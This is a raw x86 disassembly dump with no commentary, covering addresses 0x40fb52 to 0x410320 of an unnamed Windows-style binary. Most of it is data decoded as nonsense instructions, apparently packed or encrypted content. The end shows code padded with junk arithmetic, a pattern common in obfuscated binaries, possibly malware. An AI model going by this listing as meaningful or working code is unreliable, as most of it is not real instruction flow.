  40fb52:	add    dl,BYTE PTR [edi+0xc]
  40fb55:	out    dx,al
  40fb56:	jmp    0xa34b:0x54d7c69
  40fb5d:	dec    ebx
  40fb5e:	mov    DWORD PTR [ebx+0x1ec42cf5],ebp
  40fb64:	mov    cl,0x2e
  40fb66:	jg     0x40fb33
  40fb68:	addr16 mov dh,al
  40fb6b:	mov    bl,0xb
  40fb6d:	in     eax,0xbe
  40fb6f:	nop
  40fb70:	adc    al,0x28
  40fb72:	stos   DWORD PTR es:[edi],eax
  40fb73:	push   0x53
  40fb75:	test   DWORD PTR [ecx+esi*8-0x2d],ebp
  40fb79:	imul   eax,DWORD PTR [ebx],0xb46c5e11
  40fb7f:	test   DWORD PTR [ebp+0x28],ebp
  40fb82:	out    dx,al
  40fb83:	cmp    al,0x68
  40fb85:	cmp    edx,DWORD PTR [edi-0x63]
  40fb88:	(bad)  [ebx+0x596d7e7e]
  40fb8e:	sar    BYTE PTR [ebx-0x3c4c5aa],cl
  40fb94:	pop    esi
  40fb95:	add    BYTE PTR [esi],al
  40fb97:	call   0x946dfeea
  40fb9c:	scas   eax,DWORD PTR es:[edi]
  40fb9d:	sbb    al,0xab
  40fb9f:	leave  
  40fba0:	push   esp
  40fba1:	sub    BYTE PTR [edi],cl
  40fba3:	xchg   BYTE PTR [ecx-0x7],bh
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffffb6
  40fbc9:	shl    BYTE PTR [ebx],cl
  40fbcb:	sti    
  40fbcc:	shl    BYTE PTR [esi+0x7d7c7e7e],1
  40fbd2:	jle    0x40fc52
  40fbd4:	push   ds
  40fbd5:	adc    ebx,edi
  40fbd7:	sbb    al,0x55
  40fbd9:	shl    BYTE PTR [ecx-0x2bf3f411],0x8e
  40fbe0:	inc    eax
  40fbe1:	sub    eax,0xbc9a3fdd
  40fbe6:	sub    ebp,DWORD PTR [edx]
  40fbe8:	adc    BYTE PTR [ecx+ecx*4-0x26],0x78
  40fbed:	jg     0x40fc04
  40fbef:	cmp    DWORD PTR [edi],eax
  40fbf1:	and    BYTE PTR [edx-0x2c7efa38],bl
  40fbf7:	mov    ch,0xfe
  40fbf9:	xor    BYTE PTR [ebp-0x6938d972],dl
  40fbff:	not    DWORD PTR [eax-0x921cdcf]
  40fc05:	mov    edi,0xb9df8128
  40fc0a:	or     al,0xf
  40fc0c:	push   cs
  40fc0d:	sbb    al,0xec
  40fc0f:	xor    ebp,0xd99a5f8
  40fc15:	mov    ch,0x17
  40fc17:	ins    BYTE PTR es:[edi],dx
  40fc18:	dec    edx
  40fc19:	fbstp  TBYTE PTR [esi-0x2ee36794]
  40fc1f:	mov    ch,BYTE PTR [ebx-0x38]
  40fc22:	push   0xe138c6e1
  40fc27:	adc    DWORD PTR [esi+esi*1],esp
  40fc2a:	rol    BYTE PTR ds:0x5abfbb7b,cl
  40fc30:	sub    ecx,DWORD PTR [ebx-0x3890b840]
  40fc36:	loopne 0x40fc0e
  40fc38:	pushw  ss
  40fc3a:	inc    edi
  40fc3b:	pushf  
  40fc3c:	std    
  40fc3d:	mov    ch,0xf6
  40fc3f:	bound  ebp,QWORD PTR [ecx]
  40fc41:	add    eax,0x601cdd22
  40fc46:	push   ecx
  40fc47:	lods   eax,DWORD PTR ds:[esi]
  40fc48:	sbb    eax,0xf493e758
  40fc4d:	add    DWORD PTR [ecx+ebp*1],edx
  40fc50:	imul   ecx,DWORD PTR [edi+edi*2-0x646b24a8],0xcb47325
  40fc5b:	dec    esi
  40fc5c:	dec    esp
  40fc5d:	fucom  st(0)
  40fc5f:	cmp    ebx,DWORD PTR [ebx+0x6343bd38]
  40fc65:	xor    eax,0x4bc10e3
  40fc6a:	cmp    BYTE PTR [ecx-0x20c17537],cl
  40fc70:	push   ebp
  40fc71:	loopne 0x40fc90
  40fc73:	sar    edi,1
  40fc75:	aam    0xa6
  40fc77:	shl    DWORD PTR [eax-0x75],cl
  40fc7a:	adc    al,0x78
  40fc7c:	pop    ds
  40fc7d:	sbb    BYTE PTR [ebp-0x14],dl
  40fc80:	pop    edx
  40fc81:	lock xor edi,DWORD PTR [edi-0x2365a2fc]
  40fc88:	repz adc dh,ch
  40fc8b:	mov    bl,0xf9
  40fc8d:	repz repz inc esp
  40fc90:	pop    esi
  40fc91:	push   esi
  40fc92:	lods   eax,DWORD PTR ds:[esi]
  40fc93:	xchg   esi,eax
  40fc94:	je     0x40fc77
  40fc96:	lods   eax,DWORD PTR ds:[esi]
  40fc97:	das    
  40fc98:	in     al,0xa9
  40fc9a:	in     al,dx
  40fc9b:	(bad)  
  40fc9c:	bound  esp,QWORD PTR [esi]
  40fc9e:	mov    ebx,0x3e780a1c
  40fca3:	add    al,0xad
  40fca5:	mov    dh,0x99
  40fca7:	mov    dl,0xd3
  40fca9:	xlat   BYTE PTR ds:[ebx]
  40fcaa:	(bad)  
  40fcab:	cli    
  40fcac:	jae    0x40fce0
  40fcae:	ja     0x40fd23
  40fcb0:	push   ss
  40fcb1:	dec    ebx
  40fcb2:	in     eax,0x98
  40fcb4:	out    0xe6,eax
  40fcb6:	leave  
  40fcb7:	inc    edi
  40fcb8:	or     DWORD PTR [ebx-0x11],esi
  40fcbb:	repz mov dl,0xf0
  40fcbe:	and    BYTE PTR [esi],al
  40fcc0:	mov    WORD PTR [ecx-0x35],?
  40fcc3:	dec    ebp
  40fcc4:	out    dx,eax
  40fcc5:	clc    
  40fcc6:	nop
  40fcc7:	push   0x64fbf09c
  40fccc:	push   ebx
  40fccd:	in     eax,dx
  40fcce:	or     ecx,DWORD PTR [eax+0x7f]
  40fcd1:	sub    edx,DWORD PTR [ebx-0x4f0d4d2b]
  40fcd7:	hlt    
  40fcd8:	inc    esi
  40fcd9:	loope  0x40fce5
  40fcdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcdc:	mov    eax,ds:0xce29e725
  40fce1:	stos   BYTE PTR es:[edi],al
  40fce2:	aad    0x5f
  40fce4:	push   ds
  40fce5:	pop    eax
  40fce6:	and    bl,bl
  40fce8:	or     al,0x86
  40fcea:	dec    ebx
  40fceb:	sbb    dl,BYTE PTR [ebx]
  40fced:	jp     0x40fc6f
  40fcef:	xchg   esi,eax
  40fcf0:	aaa    
  40fcf1:	sbb    BYTE PTR [ebp-0x25],0x56
  40fcf5:	cwde   
  40fcf6:	sbb    al,0x13
  40fcf8:	jl     0x40fcdf
  40fcfa:	jle    0x40fcdd
  40fcfc:	(bad)  
  40fcfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcfe:	ss xchg esp,eax
  40fd00:	lods   eax,DWORD PTR ds:[esi]
  40fd01:	or     eax,0x63538f39
  40fd06:	xor    BYTE PTR [ecx],bh
  40fd08:	arpl   WORD PTR [ecx],di
  40fd0a:	mov    eax,0x4a6ded60
  40fd0f:	dec    eax
  40fd10:	add    al,0x22
  40fd12:	cmp    al,0x5a
  40fd14:	pop    ecx
  40fd15:	lods   eax,DWORD PTR ds:[esi]
  40fd16:	inc    esi
  40fd17:	sbb    al,0xaf
  40fd19:	and    ah,dl
  40fd1b:	pop    esp
  40fd1c:	lods   al,BYTE PTR ds:[esi]
  40fd1d:	int3   
  40fd1e:	out    dx,al
  40fd1f:	stos   BYTE PTR es:[edi],al
  40fd20:	jb     0x40fd37
  40fd22:	pop    es
  40fd23:	lods   eax,DWORD PTR ds:[esi]
  40fd24:	pop    esi
  40fd25:	cmp    BYTE PTR [edi+0xbbee8d2],bl
  40fd2b:	xchg   edx,eax
  40fd2c:	sub    ah,BYTE PTR [ebx-0x8]
  40fd2f:	pop    edi
  40fd30:	mov    ecx,0x3c7a6b7f
  40fd35:	sub    BYTE PTR ds:0x98725ccc,ah
  40fd3b:	(bad)  
  40fd3c:	stc    
  40fd3d:	jo     0x40fd1a
  40fd3f:	jg     0x40fd03
  40fd41:	pop    ebp
  40fd42:	mov    ebx,ebx
  40fd44:	push   ebp
  40fd45:	pop    edx
  40fd46:	mov    al,0xfd
  40fd48:	stc    
  40fd49:	or     eax,0xb6ee0eab
  40fd4e:	fild   WORD PTR [ecx-0x80]
  40fd51:	fisubr WORD PTR [edx+0x225a1bdf]
  40fd57:	push   edx
  40fd58:	cld    
  40fd59:	test   al,0xce
  40fd5b:	pop    ebx
  40fd5c:	push   edx
  40fd5d:	mov    dh,0x2d
  40fd5f:	mov    dh,0xfd
  40fd61:	adc    esi,ebx
  40fd63:	cmc    
  40fd64:	aam    0x6a
  40fd66:	out    0xb4,al
  40fd68:	jl     0x40fda4
  40fd6a:	adc    al,0x47
  40fd6c:	dec    esp
  40fd6d:	xchg   BYTE PTR [ebx+0xb],dl
  40fd70:	pop    edx
  40fd71:	mov    al,ds:0xe05798d7
  40fd76:	aam    0x40
  40fd78:	mov    DWORD PTR [eax],edx
  40fd7a:	jecxz  0x40fdf1
  40fd7c:	adc    bh,BYTE PTR [ebp-0x7b0708ba]
  40fd82:	jmp    0xdb7:0x641b3ea8
  40fd89:	retf   
  40fd8a:	xchg   DWORD PTR [eax-0x2a],esi
  40fd8d:	xchg   ebp,eax
  40fd8e:	je     0x40fdf3
  40fd90:	jne    0x40fd5b
  40fd92:	sbb    al,0xe9
  40fd94:	js     0x40fde4
  40fd96:	xlat   BYTE PTR ds:[ebx]
  40fd97:	adc    dl,bl
  40fd99:	dec    esp
  40fd9a:	fadd   DWORD PTR [esi+0x624fff13]
  40fda0:	iret   
  40fda1:	fidiv  DWORD PTR [ebp+0x75]
  40fda4:	test   al,bh
  40fda6:	(bad)  
  40fda7:	mov    WORD PTR ds:0x570,?
  40fdac:	pop    esi
  40fdad:	iret   
  40fdae:	int    0x9e
  40fdb0:	pushf  
  40fdb1:	rol    DWORD PTR [esi+0x29c44ce0],cl
  40fdb7:	test   eax,0x18ab80f
  40fdbc:	(bad)  
  40fdbd:	imul   ecx,DWORD PTR [ebp+0x1a],0xffffffbc
  40fdc1:	ret    0x61c
  40fdc4:	fistp  DWORD PTR [edi+0x2ef94263]
  40fdca:	jl     0x40fe0f
  40fdcc:	xor    esp,DWORD PTR [ebx-0x69]
  40fdcf:	add    esp,DWORD PTR [esi]
  40fdd1:	mov    ch,0xd2
  40fdd3:	(bad)  
  40fdd4:	call   0x21e5:0xd799d4c6
  40fddb:	push   cs
  40fddc:	jmp    0x40fe13
  40fdde:	sbb    eax,0xbf6fd55e
  40fde3:	xchg   edx,eax
  40fde4:	lahf   
  40fde5:	mov    ds:0x691350d5,al
  40fdea:	jp     0x40fe42
  40fdec:	cmp    eax,0xfe6bccc2
  40fdf1:	push   eax
  40fdf2:	mov    cl,BYTE PTR [edi+0x27]
  40fdf5:	call   DWORD PTR [esi]
  40fdf7:	ss or  al,0xb1
  40fdfa:	and    ebx,DWORD PTR [ebp+0x73]
  40fdfd:	ins    DWORD PTR es:[edi],dx
  40fdfe:	into   
  40fdff:	inc    esi
  40fe00:	pop    ds
  40fe01:	sahf   
  40fe02:	popf   
  40fe03:	jnp    0x40fe0f
  40fe05:	inc    ecx
  40fe06:	mov    ebp,0x67938772
  40fe0b:	stos   BYTE PTR es:[edi],al
  40fe0c:	jmp    0x6320860c
  40fe11:	sbb    ebx,DWORD PTR [edx+0x4c0d186d]
  40fe17:	test   DWORD PTR [ebx-0x3],ebp
  40fe1a:	xchg   edi,eax
  40fe1b:	ret    
  40fe1c:	xchg   ebx,eax
  40fe1d:	cwde   
  40fe1e:	and    esi,DWORD PTR [ebx+0x4fad009e]
  40fe24:	sar    cl,1
  40fe26:	hlt    
  40fe27:	xchg   ecx,eax
  40fe28:	mov    ebp,0x80b2d786
  40fe2d:	mov    gs,ebp
  40fe2f:	sbb    al,0x6
  40fe31:	(bad)  
  40fe32:	enter  0x80f6,0xf0
  40fe36:	jmp    0x40fdd9
  40fe38:	pusha  
  40fe39:	mov    al,dh
  40fe3b:	xor    DWORD PTR [eax],edx
  40fe3d:	aam    0x88
  40fe3f:	push   ecx
  40fe40:	fxam   
  40fe42:	(bad)  
  40fe43:	aam    0x20
  40fe45:	pushf  
  40fe46:	outs   dx,BYTE PTR ds:[esi]
  40fe47:	in     eax,0x8b
  40fe49:	cs mov ebx,0xf805f404
  40fe4f:	fild   QWORD PTR [ecx+0x68c5df95]
  40fe55:	push   ss
  40fe56:	jne    0x40fe62
  40fe58:	inc    esp
  40fe59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe5a:	mov    WORD PTR [edi],?
  40fe5c:	nop
  40fe5d:	cmp    edi,DWORD PTR [eax-0x51470b48]
  40fe63:	mov    ebx,0xf7f9020a
  40fe68:	rcr    BYTE PTR [ecx+0x3d],0x40
  40fe6c:	mov    ebx,0x62c5f5f4
  40fe71:	sahf   
  40fe72:	scas   eax,DWORD PTR es:[edi]
  40fe73:	push   esp
  40fe74:	xchg   esp,eax
  40fe75:	fdivrp st(1),st
  40fe77:	repz pop esp
  40fe79:	pop    ebp
  40fe7a:	dec    edx
  40fe7b:	test   eax,0xd7b41915
  40fe80:	mov    eax,0x7a19346c
  40fe85:	cmp    al,0xc5
  40fe87:	push   0xffffffb3
  40fe89:	dec    edi
  40fe8a:	sbb    BYTE PTR [ecx],bh
  40fe8c:	jno    0x40fe89
  40fe8e:	out    0x7a,al
  40fe90:	(bad)  
  40fe91:	xor    esp,ebp
  40fe93:	push   ebx
  40fe94:	mov    cl,0xe
  40fe96:	(bad)  
  40fe97:	jmp    0x2bed:0x1c06321e
  40fe9e:	mov    al,ss:0xa2444879
  40fea4:	popa   
  40fea5:	mov    ds:0xd2f8b9a4,eax
  40feaa:	xchg   BYTE PTR [ebp-0x45],ah
  40fead:	jmp    0x9ba2b87b
  40feb2:	sbb    DWORD PTR ds:0x22ae7c94,esi
  40feb8:	pop    ds
  40feb9:	push   ecx
  40feba:	cmp    BYTE PTR [esi],ch
  40febc:	cmp    eax,esi
  40febe:	or     eax,0x58303733
  40fec3:	jnp    0x40fe72
  40fec5:	dec    edi
  40fec6:	dec    ebx
  40fec7:	sub    esp,eax
  40fec9:	pop    es
  40feca:	xor    eax,0xa935eae3
  40fecf:	scas   al,BYTE PTR es:[edi]
  40fed0:	pop    ss
  40fed1:	int    0x13
  40fed3:	inc    ecx
  40fed4:	pusha  
  40fed5:	xor    ecx,DWORD PTR [ebx-0x2dccf3bb]
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0xc94346
  40fef3:	in     eax,0x48
  40fef5:	fidiv  WORD PTR [ebp+0x7d7c7e7e]
  40fefb:	jle    0x40ff7b
  40fefd:	pop    esi
  40fefe:	fidivr WORD PTR [ebx]
  40ff00:	loopne 0x40fefc
  40ff02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff03:	mov    ?,ebx
  40ff05:	xchg   ebp,eax
  40ff06:	loopne 0x40fee1
  40ff08:	sbb    bl,BYTE PTR [eax+0x12d2e8aa]
  40ff0e:	lods   al,BYTE PTR ds:[esi]
  40ff0f:	or     DWORD PTR [ebx+ebp*2-0x47b24da0],0x59
  40ff17:	fs std 
  40ff19:	icebp  
  40ff1a:	clc    
  40ff1b:	pop    edx
  40ff1c:	push   cs
  40ff1d:	sar    DWORD PTR ss:[esi],0x63
  40ff21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff22:	stc    
  40ff23:	paddd  mm2,mm2
  40ff26:	xchg   ebx,eax
  40ff27:	add    bh,dh
  40ff29:	mov    dh,0xf3
  40ff2b:	nop
  40ff2c:	pop    es
  40ff2d:	sbb    eax,0x22863783
  40ff32:	jns    0x40ffa1
  40ff34:	add    ecx,DWORD PTR ds:[eax]
  40ff37:	fdiv   DWORD PTR [esi+edi*4+0x6d]
  40ff3b:	(bad)  
  40ff3c:	sub    esi,DWORD PTR [ecx-0x80]
  40ff3f:	dec    ecx
  40ff40:	push   edx
  40ff41:	or     al,0xa4
  40ff43:	sub    cl,BYTE PTR [ecx+ebx*8-0x406b5ff0]
  40ff4a:	sar    BYTE PTR [ecx-0x597d0c29],0xe7
  40ff51:	inc    eax
  40ff52:	dec    edx
  40ff53:	(bad)  
  40ff55:	pop    es
  40ff56:	(bad)  
  40ff57:	out    0xe5,eax
  40ff59:	xor    edx,DWORD PTR [edx+0x6845f519]
  40ff5f:	cs pop edx
  40ff61:	test   DWORD PTR [edx],edx
  40ff63:	mov    al,0xd8
  40ff65:	pop    eax
  40ff66:	sub    dl,BYTE PTR [ebx-0xb38e5cc]
  40ff6c:	pop    es
  40ff6d:	std    
  40ff6e:	fucomip st,st(2)
  40ff70:	(bad)  
  40ff71:	frstor [ebp-0x50]
  40ff74:	xlat   BYTE PTR ds:[ebx]
  40ff75:	sbb    BYTE PTR ds:0xa2a8e62f,ch
  40ff7b:	jecxz  0x40ff07
  40ff7d:	rcl    BYTE PTR [ebp+edi*4+0x42161f03],0xeb
  40ff85:	fs and dl,cl
  40ff88:	pop    ebp
  40ff89:	loopne 0x40ffce
  40ff8b:	lahf   
  40ff8c:	xor    eax,0x97519797
  40ff91:	je     0x410011
  40ff93:	xchg   esi,eax
  40ff94:	nop
  40ff95:	add    ebp,ebp
  40ff97:	outs   dx,DWORD PTR ds:[si]
  40ff99:	arpl   WORD PTR [esi-0x5d],bp
  40ff9c:	xchg   ecx,eax
  40ff9d:	fwait
  40ff9e:	mov    ebp,0x619f908
  40ffa3:	jo     0x40ff94
  40ffa5:	int    0x18
  40ffa7:	mov    eax,ds:0x4c6695c1
  40ffac:	pop    ecx
  40ffad:	jg     0x41000f
  40ffaf:	inc    ebp
  40ffb0:	(bad)  
  40ffb1:	push   ebp
  40ffb2:	enter  0xef5e,0x98
  40ffb6:	cs push eax
  40ffb8:	arpl   WORD PTR [ebp-0xa118b3f],sp
  40ffbe:	outs   dx,BYTE PTR ds:[esi]
  40ffbf:	jecxz  0x40fff7
  40ffc1:	sub    BYTE PTR [edi+edi*4+0x30f8a555],0xf2
  40ffc9:	arpl   WORD PTR [eax*4-0x5b2cef12],cx
  40ffd0:	ins    DWORD PTR es:[edi],dx
  40ffd1:	push   ds
  40ffd2:	int3   
  40ffd3:	in     eax,dx
  40ffd4:	and    bh,BYTE PTR [esi]
  40ffd6:	and    ecx,ebx
  40ffd8:	add    ebp,DWORD PTR [ebx-0x2e]
  40ffdb:	cmp    eax,0x8e5118eb
  40ffe0:	xor    edx,DWORD PTR [eax+0x171797c1]
  40ffe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffe7:	mov    eax,0x239f1120
  40ffec:	loop   0x40ffdc
  40ffee:	and    edx,DWORD PTR [ebx+0xffcb555]
  40fff4:	movhps QWORD PTR [edi-0x26],xmm4
  40fff8:	push   edx
  40fff9:	pop    ebp
  40fffa:	mov    al,ds:0xadf9a4a4
  40ffff:	test   DWORD PTR [esi],eax
  410001:	or     al,BYTE PTR [ebx]
  410003:	gs push edi
  410005:	fwait
  410006:	or     al,0x33
  410008:	pusha  
  410009:	test   esi,ebp
  41000b:	fisubr DWORD PTR [esi+eiz*1-0x75]
  41000f:	fdiv   st,st(1)
  410011:	mov    ch,0x2a
  410013:	inc    ecx
  410014:	add    DWORD PTR [edx-0x4e],esp
  410017:	sti    
  410018:	jno    0x41002c
  41001a:	leave  
  41001b:	dec    esi
  41001c:	push   es
  41001d:	pop    es
  41001e:	inc    eax
  41001f:	xor    dh,BYTE PTR [ebx+0x19]
  410022:	jbe    0x410075
  410024:	or     bl,BYTE PTR [edx]
  410026:	jg     0x410056
  410028:	xchg   al,cl
  41002a:	nop
  41002b:	adc    bl,BYTE PTR [ebp-0x3b70862a]
  410031:	inc    eax
  410033:	push   ds
  410034:	pop    edx
  410035:	daa    
  410036:	mov    ebp,0x35f6a1a1
  41003b:	xchg   ecx,eax
  41003c:	lods   eax,DWORD PTR ds:[esi]
  41003d:	retf   
  41003e:	sbb    al,BYTE PTR [esi-0x580641d3]
  410044:	dec    edx
  410045:	(bad)
  410049:	ins    BYTE PTR es:[edi],dx
  41004a:	sbb    esi,DWORD PTR [esi-0x37]
  41004d:	outs   dx,BYTE PTR ds:[esi]
  41004e:	or     ecx,DWORD PTR [edx]
  410050:	fwait
  410051:	cmp    al,BYTE PTR [eax-0x4c]
  410054:	stc    
  410055:	nop
  410056:	fimul  DWORD PTR [esp+edx*4+0x66af8224]
  41005d:	and    BYTE PTR [edx-0x39367744],al
  410063:	xchg   ebx,eax
  410064:	dec    ebp
  410065:	clc    
  410066:	enter  0x55de,0x87
  41006a:	in     al,dx
  41006b:	repz jno 0x4100c7
  41006e:	inc    ebp
  41006f:	test   BYTE PTR ds:0xa1338153,cl
  410075:	mov    eax,ds:0xa1277b48
  41007a:	cwde   
  41007b:	dec    ebp
  41007c:	sub    DWORD PTR [edx+0x5102761e],ebp
  410082:	jge    0x41005e
  410084:	setbe  BYTE PTR [edi]
  410087:	dec    ebx
  410088:	imul   edx,DWORD PTR [ecx],0x49
  41008b:	fistp  QWORD PTR [ebx-0x74]
  41008e:	out    0x11,eax
  410090:	mov    BYTE PTR [ebp+0x4e],ah
  410093:	(bad)  
  410094:	jb     0x410097
  410096:	jge    0x41004a
  410098:	mov    BYTE PTR [edx-0x3fcf9f19],cl
  41009e:	scas   al,BYTE PTR es:[edi]
  41009f:	das    
  4100a0:	mov    ds:0xeb7dff3d,eax
  4100a5:	paddw  mm2,mm0
  4100a8:	in     eax,0x86
  4100aa:	call   0xab5d6c52
  4100af:	ins    BYTE PTR es:[edi],dx
  4100b0:	add    al,0x71
  4100b2:	outs   dx,DWORD PTR ds:[esi]
  4100b3:	sub    esi,DWORD PTR [eax+0x533ef9cc]
  4100b9:	xchg   esi,eax
  4100ba:	inc    edi
  4100bb:	mov    dh,0xb6
  4100bd:	xchg   edi,eax
  4100be:	lahf   
  4100bf:	je     0x4100f8
  4100c1:	sbb    bh,ch
  4100c3:	stos   DWORD PTR es:[edi],eax
  4100c4:	sahf   
  4100c5:	inc    edx
  4100c6:	jecxz  0x4100b6
  4100c8:	inc    eax
  4100c9:	jmp    0x410053
  4100cb:	jns    0x4100d8
  4100cd:	sbb    al,0x49
  4100cf:	and    DWORD PTR [ebx+0x66],eax
  4100d2:	cmp    al,0x60
  4100d4:	cli    
  4100d5:	jne    0x4100d2
  4100d7:	xchg   DWORD PTR [ebp-0x6b],eax
  4100da:	test   BYTE PTR ds:0xaa4b590e,dl
  4100e0:	aam    0xcd
  4100e2:	add    esp,DWORD PTR [ebx]
  4100e4:	arpl   WORD PTR [ecx+ebp*2+0x72],bx
  4100e8:	pop    edx
  4100e9:	in     al,0x75
  4100eb:	cmp    edx,edi
  4100ed:	pop    eax
  4100ee:	adc    BYTE PTR [ebx+0x19],bl
  4100f1:	xchg   esi,eax
  4100f2:	mov    ebp,0xb2ab0538
  4100f7:	adc    eax,0xf9cc6a69
  4100fc:	test   DWORD PTR [edx+0x2],esi
  4100ff:	scas   al,BYTE PTR es:[edi]
  410100:	pushf  
  410101:	mov    eax,0xe0b49c3e
  410106:	adc    ah,dl
  410108:	mov    WORD PTR [edx],es
  41010a:	lods   al,BYTE PTR ds:[esi]
  41010b:	loopne 0x410149
  41010d:	(bad)  
  41010e:	maskmovq mm3,(bad)
  41010f:	neg    DWORD PTR [edi+0x2d2eea32]
  410115:	outs   dx,DWORD PTR ds:[esi]
  410116:	sbb    dl,bh
  410118:	out    0x4e,eax
  41011a:	mov    ah,0xf1
  41011c:	jmp    0x3e60:0xaa382003
  410123:	push   cs
  410124:	cmp    BYTE PTR [ebp+edi*1+0x56a53232],cl
  41012b:	rol    DWORD PTR [ebx-0x4c1b5b1d],1
  410131:	das    
  410132:	jne    0x410162
  410134:	adc    eax,0x5d6797f
  410139:	jne    0x41015b
  41013b:	mov    cs,WORD PTR [edi]
  41013d:	je     0x4101bd
  41013f:	outs   dx,BYTE PTR ds:[esi]
  410140:	popa   
  410141:	pop    eax
  410142:	inc    edi
  410143:	hlt    
  410144:	nop
  410145:	stos   BYTE PTR es:[edi],al
  410146:	mov    al,0x8d
  410148:	mov    ds:0x11add37,al
  41014d:	push   edi
  41014e:	mov    esi,0x989f3461
  410153:	rcr    DWORD PTR [esp+eiz*4],1
  410156:	jecxz  0x4101bf
  410158:	mov    bl,0x6d
  41015a:	inc    ebx
  41015b:	and    DWORD PTR [ecx+0x47fac454],esp
  410161:	jp     0x410124
  410163:	int    0x2b
  410165:	mov    fs,WORD PTR [ebx+0x61510a37]
  41016b:	add    al,0xce
  41016d:	mov    al,ds:0x9558c832
  410172:	add    ebx,esi
  410174:	aam    0x3
  410176:	push   ecx
  410177:	push   ds
  410178:	rcr    DWORD PTR [edi-0x39],cl
  41017b:	sti    
  41017c:	mov    dl,al
  41017e:	add    dl,0x3c
  410181:	mov    ch,0xc5
  410183:	jnp    0x4101ce
  410185:	push   0x46840f9a
  41018a:	or     BYTE PTR [ecx+0x5dc99ae5],ch
  410190:	ficom  WORD PTR [ebp+edx*2-0xa1f11a2]
  410197:	xor    DWORD PTR ds:0x95762a3d,esi
  41019d:	cld    
  41019e:	aam    0x5
  4101a0:	sub    bl,0x8f
  4101a3:	cdq    
  4101a4:	enter  0xfe13,0x73
  4101a8:	leave  
  4101a9:	loopne 0x4101c0
  4101ab:	loope  0x410172
  4101ad:	dec    esi
  4101ae:	xchg   esp,eax
  4101af:	jne    0x4101ee
  4101b1:	mov    al,ds:0x722bf4ed
  4101b6:	push   esi
  4101b7:	jbe    0x410191
  4101b9:	sub    ah,BYTE PTR [ebx-0x59]
  4101bc:	nop
  4101bd:	fs jne 0x410209
  4101c0:	pop    ds
  4101c1:	shr    bh,0x5c
  4101c4:	jbe    0x41016f
  4101c6:	xchg   edx,eax
  4101c7:	rol    ah,cl
  4101c9:	inc    edi
  4101ca:	scas   eax,DWORD PTR es:[edi]
  4101cb:	das    
  4101cc:	xor    BYTE PTR [ebp-0x1f49da9c],bl
  4101d2:	es dec ebp
  4101d4:	sbb    ch,BYTE PTR [ebp+0x55f76ad3]
  4101da:	loop   0x410166
  4101dc:	push   es
  4101dd:	push   DWORD PTR [ecx+0x6c8e812a]
  4101e3:	mov    esi,0x3c2217e8
  4101e8:	and    ebp,DWORD PTR [esi]
  4101ea:	call   0x53ed42de
  4101ef:	imul   ecx,DWORD PTR [ebx+0x4a9b4b6f],0xfffffff7
  4101f6:	jnp    0x410245
  4101f8:	sti    
  4101f9:	sub    bh,BYTE PTR [ebp+0x29801fc3]
  4101ff:	div    ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43379f
  41021e:	adc    DWORD PTR ds:0x4337d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43370b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43382b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4337df
  41026b:	or     DWORD PTR ds:0x4337d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4337ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4337ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4337ab,ecx
  410291:	cmp    DWORD PTR ds:0x4337ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4337ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4337ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4337ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4337ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433703
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4337e7,0x43379f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4337e3,0x433797
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433757
  41031a:	sub    DWORD PTR ds:0x43371f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
